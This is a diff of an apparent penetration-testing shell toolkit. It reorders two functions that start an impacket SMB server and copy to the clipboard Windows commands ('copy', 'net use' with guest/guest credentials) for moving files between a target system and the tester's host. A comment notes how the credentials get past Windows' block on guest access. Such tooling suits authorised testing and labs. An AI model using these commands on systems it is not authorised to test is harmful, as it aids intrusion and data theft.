@@ -217,20 +217,17 @@ nb-srv-smb-null() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
-  echo
   __COMMAND="copy \\${__LHOST}\share\\$filename"
   echo "$__COMMAND" | wl-copy
   __info "Command to use on a target system copied to clipboard"
-
-  echo
-  pushd "$HOME/desktop/server" &> /dev/null
-  __info "Serving content at $(hip) in $PWD"
-	sudo impacket-smbserver -smb2support share ./
   __info "The server can authenticate without credentials."
-  echo
   __info "You can mount the share on the box and copy files to it using commands:"
-  __ok "  net use x: \\\\${__LHOST}\\share /user:guest guest"
+  __ok "  net use x: \\\\\\${__LHOST}\\\\share"
   __ok "  cmd /c \"copy filename.txt X:\\\""
+  pushd "$HOME/desktop/server" &> /dev/null
+  echo
+  __info "Serving content at $(hip) in $PWD"
+	sudo smbserver.py -smb2support share ./
   popd &> /dev/null
 }
 
@@ -256,23 +253,21 @@ nb-srv-smb-auth() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
-  echo
   __COMMAND1="net use n: \\${__LHOST}\share /user:test test"
   __COMMAND2="copy n:\\$filename"
   echo "$__COMMAND2" | wl-copy
   echo "$__COMMAND1" | wl-copy
   __info "2 Commands to use on a target system copied to clipboard"
+  __info "The server will use the credentials guest/guest for authentication."
+  __info "You can mount the share on the box and copy files to it using commands:"
+  __ok "  net use x: \\\\\\${__LHOST}\\\\share /user:guest guest"
+  __ok "  cmd /c \"copy filename.txt X:\\\""
 
   # New versions of Windows block unauthenticated guest access, to bypass set username and pass
-  echo
   pushd "$HOME/desktop/server" &> /dev/null
-  __info "Serving content at $(hip) in $PWD"
-	sudo impacket-smbserver -smb2support -username guest -password guest share ./ 
-  __info "The server will use the credentials guest/guest for authentication."
   echo
-  __info "You can mount the share on the box and copy files to it using commands:"
-  __ok "  net use x: \\\\${__LHOST}\\share /user:guest guest"
-  __ok "  cmd /c \"copy filename.txt X:\\\""
+  __info "Serving content at $(hip) in $PWD"
+	sudo smbserver.py -smb2support -username guest -password guest share ./ 
   popd &> /dev/null
 }
 
